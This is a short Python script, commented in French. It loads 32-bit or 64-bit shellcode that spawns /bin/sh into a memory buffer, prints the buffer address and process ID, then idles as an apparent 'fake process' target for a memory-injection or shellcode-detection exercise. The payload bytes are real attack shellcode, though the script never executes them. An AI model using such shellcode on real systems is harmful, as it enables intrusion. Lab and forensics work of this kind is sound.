import ctypes
import os
import time

def inject_shellcode_in_memory(payload: bytes):
    buf = ctypes.create_string_buffer(payload)
    print(f"[*] Shellcode placé en mémoire à l'adresse : {ctypes.addressof(buf):#x}")
    return buf

if __name__ == "__main__":
    print(f"[*] PID du fake process : {os.getpid()}")
    choice = input("Injecter shellcode 32 bits (1) ou 64 bits (2) ? ")

    if choice == "1":
        payload = (
            b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
            b"\x68\x2f\x62\x69\x6e"
            b"\x89\xe3\x50\x53\x89\xe1\xb0\x0b"
            b"\xcd\x80"
        )
    elif choice == "2":
        payload = (
            b"\x48\x31\xd2"
            b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
            b"\x53"
            b"\x48\x89\xe7"
            b"\x50"
            b"\x57"
            b"\x48\x89\xe6"
            b"\xb0\x3b"
            b"\x0f\x05"
        )
    else:
        print("[!] Choix invalide.")
        exit(1)

    inject_shellcode_in_memory(payload)

    while True:
        time.sleep(10)

